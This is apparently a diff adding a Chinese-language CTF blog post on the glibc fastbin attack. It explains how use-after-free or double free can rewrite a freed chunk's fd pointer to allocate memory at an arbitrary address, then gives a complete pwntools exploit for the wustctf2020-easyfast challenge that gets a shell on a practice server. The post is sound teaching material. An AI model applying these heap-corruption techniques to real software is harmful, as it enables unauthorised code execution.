@@ -163,6 +163,80 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/04/11/fastbin%20attacked/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="A2ure">
+      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A2ure的梦想小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/11/fastbin%20attacked/" class="post-title-link" itemprop="url">fastbin attacked</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-11 00:00:00 / 修改时间：21:10:34" itemprop="dateCreated datePublished" datetime="2022-04-11T00:00:00+08:00">2022-04-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="fastbin-attacked"><a href="#fastbin-attacked" class="headerlink" title="fastbin attacked"></a>fastbin attacked</h1><h2 id="一、什么是fastbin"><a href="#一、什么是fastbin" class="headerlink" title="一、什么是fastbin"></a>一、什么是fastbin</h2><p>在glibc的堆块管理中，为了加快堆块分配的效率，会使用bins来管理分配了之后又释放的空闲堆块，当用户分配内存时，系统会先从bins里面寻找是否有合适大小的堆块，如果没有再考虑另外的分配方式（如top chunk切割等）。fastbin就是这样的一个bins，当大小在0x20~0x80的堆块被释放后就会进入fastbin。fastbin使用的是单链表链接的方式保存堆块，而且单条链表中的chunk大小是一致的。</p>
+<p>在主线程中会存在一个名为fastbinY的全局变量数组，大小为7，用于存放fastbin单个链表的头指针。 fastbin采用的是先进后出的方式，至此我们对fastbin有了一个大体的认识，如图：</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/04/11/1696d9b9d69e2ac0.png"> </p>
+<h2 id="二、fastbin-attacked的原理"><a href="#二、fastbin-attacked的原理" class="headerlink" title="二、fastbin attacked的原理"></a>二、fastbin attacked的原理</h2><h3 id="1-漏洞产生的原因"><a href="#1-漏洞产生的原因" class="headerlink" title="1.漏洞产生的原因"></a>1.漏洞产生的原因</h3><p>由于fastbin在分配堆块时并不会检测这个堆块的来源，意思是即便它不是系统正确分配的空间，只要它在fastbin这条链表里面，并且刚好满足用户的申请空间需求，这个chunk就会被取出提供给用户。由此我们不难想到，如果我们在fastbin的链表里面修改单链表尾元素chunk的fd指针，使其指向某个区域，然后再申请回来，就可以做到再任意空间上申请堆块，从而做到任意内存的读写。</p>
+<h3 id="2-利用的方式"><a href="#2-利用的方式" class="headerlink" title="2.利用的方式"></a>2.利用的方式</h3><p>在具体利用的过程中，我们可以通过double free或者uaf等可以控制空闲堆块data区域的漏洞去修改fd指针，指向我们想要控制内容堆块地址-0x10的地方，至于为什么要-0x10，是chunk分配时会有0x10大小的区域去存储size和pre_size，剩下的才是用户的data区。这点在之前chunk的基本结构中就有。此外，虽然fastbin不会检测这个chunk来源的合法性，但是它会检测chunk的size是否与该链表的其他堆块的size相同，由此可得fastbin attacked需要在我们伪造堆块的上方有一个合适的size值</p>
+<h2 id="三、例题-wustctf2020-easyfast"><a href="#三、例题-wustctf2020-easyfast" class="headerlink" title="三、例题 wustctf2020-easyfast"></a>三、例题 wustctf2020-easyfast</h2><h3 id="1-程序分析"><a href="#1-程序分析" class="headerlink" title="1.程序分析"></a>1.程序分析</h3><p>首先ida打开发现是经典菜单题</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/04/11/cbae5a1b451c7111.png"> </p>
+<p>程序里有一个backdoor函数</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/04/11/95ba3d0a480b4a77.png"> </p>
+<p>于此同时在delete的函数中存在着UAF漏洞，可以控制空闲堆块的data区。</p>
+<p>此时我们gdb连上去查看这个0x602090是个什么情况</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/04/11/0e141d8fbe244576.png"> </p>
+<p>可以看到在这个地址里存放的是1，所以只需要0x602090地址的判断为0，就可以get shell。在这个区域-0x10的位置有一个50，刚好可以作为fake fastchunk的size值，因此这里我们采用UAF+fastbin attacked，将一个堆块申请到0x602090的位置。</p>
+<h3 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./fast&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28956</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gai</span>(<span class="params">index,content</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">     sleep(<span class="number">0.1</span>)</span><br><span class="line">     p.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">     p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload=<span class="number">0x602080</span></span><br><span class="line">gai(<span class="number">0</span>,p64(payload))</span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#free 0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">gai(<span class="number">2</span>,p64(<span class="number">0</span>))</span><br><span class="line">shell()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-另一种方法"><a href="#3-另一种方法" class="headerlink" title="3.另一种方法"></a>3.另一种方法</h3><p>在这里，我们同样可以使用double free去进行get shell，但题目已经有UAF，就没有必要去构造double free去控制空闲堆块</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/03/17/2022-03-17-off-by-one/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -395,7 +469,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
